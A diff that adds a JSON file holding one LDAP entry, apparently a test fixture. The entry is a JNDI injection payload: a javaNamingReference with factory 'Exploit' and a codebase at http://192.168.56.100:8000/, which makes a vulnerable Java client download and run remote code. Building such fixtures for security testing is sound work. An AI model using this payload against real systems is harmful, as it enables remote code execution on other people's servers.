@@ -1,0 +1,27 @@
+{
+  "count": 1,
+  "0": {
+    "javaclassname": {
+      "count": 1,
+      "0": "foo"
+    },
+    "0": "javaclassname",
+    "javacodebase": {
+      "count": 1,
+      "0": "http:\/\/192.168.56.100:8000\/"
+    },
+    "1": "javacodebase",
+    "objectclass": {
+      "count": 1,
+      "0": "javaNamingReference"
+    },
+    "2": "objectclass",
+    "javafactory": {
+      "count": 1,
+      "0": "Exploit"
+    },
+    "3": "javafactory",
+    "count": 4,
+    "dn": "\/a"
+  }
+}
